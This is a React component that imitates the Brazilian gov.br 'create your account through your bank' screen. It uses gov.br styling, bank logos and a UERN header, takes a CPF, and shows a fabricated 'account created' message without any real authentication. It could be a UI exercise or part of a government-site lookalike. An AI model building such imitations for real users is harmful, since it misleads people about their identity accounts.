import { useState } from 'react';
import { CheckCircle, AlertCircle, HelpCircle } from 'lucide-react';
import ValidationData from './ValidationData';

interface BankSelectionProps {
  cpf: string;
  onBack: () => void;
}

interface Bank {
  id: string;
  name: string;
  logo: string;
}

const banks: Bank[] = [
  { id: 'bb', name: 'Banco do Brasil', logo: 'https://wwfbrnew.awsassets.panda.org/img/original/banco_do_brasil_logo2.jpg' },
  { id: 'banrisul', name: 'Banrisul', logo: 'https://play-lh.googleusercontent.com/qoispg0M3Fi9RhpnerVlqrdX6ELVHkhRcPoNUN9Srr9yX2qWc1OC9mIbsU-3ClQTQA' },
  { id: 'bradesco', name: 'Bradesco', logo: 'https://assets.b9.com.br/wp-content/uploads/2018/11/Bradesco-novo-logo1.jpg' },
  { id: 'brasilia', name: 'Banco de Brasília', logo: 'https://files.sunoresearch.com.br/n/uploads/2021/06/130197ba-banco-de-brasilia.jpg' },
  { id: 'caixa', name: 'Caixa Econômica', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYM9htyp2Ua7OgwX4fLafp8gvOduMFm--PZg&s' },
  { id: 'sicoob', name: 'Sicoob', logo: 'https://www.sicoob.com.br/documents/2044463/301203639/Logo+Sicoob+-+marca+pura+2023.png/5f57d851-05d0-8f53-0285-cbc1e08ff776?t=1762285800494' },
  { id: 'santander', name: 'Santander', logo: 'https://www.santander.com.br/sites/WPC_CMS/imagem/25-09-01_140349_M_santander_pf.png?blobnocache=true' },
  { id: 'banese', name: 'Banese', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5cDghCymbHDaq9iKk5TZaBqi5Qdij_KHOhQ&s' },
  { id: 'banestes', name: 'Banestes', logo: 'https://www.infomoney.com.br/wp-content/uploads/2022/02/Banestes_divulgacao.jpg?fit=1891%2C1024&quality=50&strip=all' },
  { id: 'itau', name: 'Itaú', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2T_FZUpNv7ceeAbp0pOsjuB0zpmETDx9RYA&s' },
  { id: 'sicredi', name: 'Sicredi', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWmw4WWLDDVpIai40obsluAEBcnR8PDHaSKA&s' },
];

export default function BankSelection({ cpf, onBack }: BankSelectionProps) {
  const [isLoading, setIsLoading] = useState(false);
  const [showValidation, setShowValidation] = useState(false);
  const [modal, setModal] = useState({
    isOpen: false,
    type: 'success' as 'success' | 'error',
    title: '',
    message: '',
  });

  const handleBankSelect = async (bankName: string) => {
    setIsLoading(true);
    try {
      await new Promise(resolve => setTimeout(resolve, 2000));
      setModal({
        isOpen: true,
        type: 'success',
        title: 'Parabéns!',
        message: `Sua conta prata foi criada com sucesso via ${bankName}!`,
      });
      setTimeout(() => { onBack(); }, 3000);
    } finally {
      setIsLoading(false);
    }
  };

  const handleTryAnother = () => {
    setShowValidation(true);
  };

  if (showValidation) {
    return <ValidationData cpf={cpf} onBack={() => setShowValidation(false)} />;
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header - Logo UERN () */}
      <header className="bg-[#1351B4] px-6 py-3 flex items-center">
        <div className="flex items-center gap-2">
          <img 
            src="https://redeunisustentavel.com.br/wp-content/uploads/2024/07/UERN.jpg"
            alt="Logo UERN"
            className="h-8 w-auto object-contain"
            onError={(e) => {
              (e.target as HTMLImageElement).src = 'https://via.placeholder.com/32x32/1351B4/FFFFFF?text=UERN';
            }}
          />
          <span className="text-white text-sm font-semibold">UERN</span>
        </div>
      </header>

      <div className="flex-1 flex items-center justify-center px-6 py-12">
        <div className="w-full max-w-4xl">
          <h2 className="text-2xl text-gray-800 mb-2 font-semibold">Vamos criar sua conta gov.br através do seu banco?</h2>
          <p className="text-gray-600 text-sm mb-2">Não teremos acesso a seus dados bancários - apenas a seu nome e CPF</p>
          <p className="text-gray-600 text-sm mb-8">Escolha o banco que você já usa pela internet.</p>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
            {banks.map((bank) => (
              <button key={bank.id} onClick={() => handleBankSelect(bank.name)} disabled={isLoading}
                className="bg-white border-2 border-gray-200 rounded-lg p-6 hover:border-[#1351B4] hover:shadow-lg transition-all active:scale-95 disabled:opacity-50 flex flex-col items-center gap-3">
                <img src={bank.logo} alt={bank.name} className="w-16 h-16 object-contain" 
                  onError={(e) => { (e.currentTarget).src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect fill="%23E5E7EB" width="100" height="100"/%3E%3Ctext x="50" y="50" font-size="14" text-anchor="middle" dy=".3em" fill="%236B7280"%3E?%3C/text%3E%3C/svg%3E'; }} />
                <span className="text-sm font-medium text-gray-800 text-center">{bank.name}</span>
              </button>
            ))}
          </div>

          <div className="flex items-center justify-between flex-wrap gap-4">
            <button className="flex items-center gap-2 text-[#1351B4] hover:underline text-sm">
              <HelpCircle className="w-4 h-4" />
              <span>O acesso pelo meu banco é seguro?</span>
            </button>
            <div className="flex items-center gap-4">
              <button onClick={onBack} disabled={isLoading} className="text-[#1351B4] py-2 px-4 rounded-full font-semibold hover:underline">Voltar ao início</button>
              <button onClick={handleTryAnother} disabled={isLoading} className="bg-[#1351B4] text-white py-2 px-6 rounded-full font-semibold hover:bg-[#0c3a7d] transition-all active:scale-95">Tente de outra forma</button>
            </div>
          </div>
        </div>
      </div>

      {modal.isOpen && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className={`bg-white rounded-lg shadow-lg border-2 max-w-sm w-full p-6 ${modal.type === 'success' ? 'border-green-300 bg-green-50' : 'border-blue-300 bg-blue-50'}`}>
            <div className="flex items-start gap-4">
              <CheckCircle className="w-6 h-6 text-green-600 flex-shrink-0 mt-0.5" />
              <div><h3 className="font-bold text-lg text-gray-900 mb-2">{modal.title}</h3><p className="text-gray-700 text-sm">{modal.message}</p></div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}